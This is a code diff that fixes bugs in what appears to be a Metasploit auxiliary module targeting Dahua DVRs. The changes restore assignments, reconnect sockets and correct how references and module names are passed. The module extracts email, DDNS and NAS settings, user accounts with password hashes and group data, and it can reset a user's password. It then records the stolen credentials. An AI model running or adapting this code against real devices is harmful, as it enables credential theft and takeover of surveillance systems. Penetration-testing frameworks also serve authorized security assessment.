@@ -82,12 +82,12 @@ class Metasploit3 < Msf::Auxiliary
         serial = Regexp.last_match[1]
         print_status("Serial Number: #{serial} @ #{rhost}:#{rport}!")
       end
-
+      connect
       sock.put(email)
-      if data == sock.get(1024).split('&&')
+      if data = sock.get(1024).split('&&')
         print_status("Email Settings: @ #{rhost}:#{rport}!")
         if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
-          if mailhost == Regexp.last_match[1].split(':')
+          if mailhost = Regexp.last_match[1].split(':')
             print_status("	Server: #{mailhost[0]}") unless mailhost[0].nil?
             print_status("	Destination Email: #{data[1]}") unless mailhost[1].nil?
           end
@@ -105,9 +105,9 @@ class Metasploit3 < Msf::Auxiliary
           end
         end
       end
-
+      connect
       sock.put(ddns)
-      if data == sock.get(1024)
+      if data = sock.get(1024)
         data = data.split(/&&[0-1]&&/)
         data.each_with_index do |val, index|
           if index > 0
@@ -132,9 +132,9 @@ class Metasploit3 < Msf::Auxiliary
           end
         end
       end
-
+      connect
       sock.put(nas)
-      if data == sock.get(1024)
+      if data = sock.get(1024)
         print_status("Nas Settings @ #{rhost}:#{rport}!:")
         server = ''
         port = ''
@@ -155,7 +155,7 @@ class Metasploit3 < Msf::Auxiliary
           end
         end
       end
-
+      connect
       sock.put(channels)
       data = sock.get(1024).split('&&')
       disconnect
@@ -165,7 +165,7 @@ class Metasploit3 < Msf::Auxiliary
       end
       connect
       sock.put(users)
-      if data == sock.get(1024).split('&&')
+      if data = sock.get(1024).split('&&')
         print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
         data.each do |val|
           usercount += 1
@@ -186,12 +186,13 @@ class Metasploit3 < Msf::Auxiliary
             sname: 'dvr',
             name: 'Dahua Authentication Password Hash Exposure',
             info: "Obtained password hash for user #{username}: #{md5hash}",
-            refs: :references
+            refs: references
           )
         end
       end
+      connect
       sock.put(groups)
-      if data == sock.get(1024).split('&&')
+      if data = sock.get(1024).split('&&')
         print_status("User Groups: @ #{rhost}:#{rport}!")
         data.each { |val| print_status("	#{val[/(([\d]+)[:]([\w]+))/]}") }
       end
@@ -210,7 +211,7 @@ class Metasploit3 < Msf::Auxiliary
         sock.put(u3)
         data = sock.get(1024)
         sock.put(u1)
-        if data == sock.get(1024)
+        if data = sock.get(1024)
           print_good("PASSWORD RESET!: user #{datastore['USERNAME']}'s password reset to #{datastore['PASSWORD']}! @ #{rhost}:#{rport}!")
         end
 # 			elsif (datastore['ACTION'] == "DELETE")
@@ -304,7 +305,7 @@ class Metasploit3 < Msf::Auxiliary
     }
 
     credential_data = {
-      module_fullname: :fullname,
+      module_fullname: fullname,
       origin_type: :service,
       private_data: hash,
       private_type: :nonreplayable_hash,
@@ -330,7 +331,7 @@ class Metasploit3 < Msf::Auxiliary
     }
 
     credential_data = {
-      module_fullname: :fullname,
+      module_fullname: fullname,
       origin_type: :service,
       private_data: ddns_pass,
       private_type: :password,
@@ -355,7 +356,7 @@ class Metasploit3 < Msf::Auxiliary
     }
 
     credential_data = {
-      module_fullname: :fullname,
+      module_fullname: fullname,
       origin_type: :service,
       private_data: mpass,
       private_type: :password,
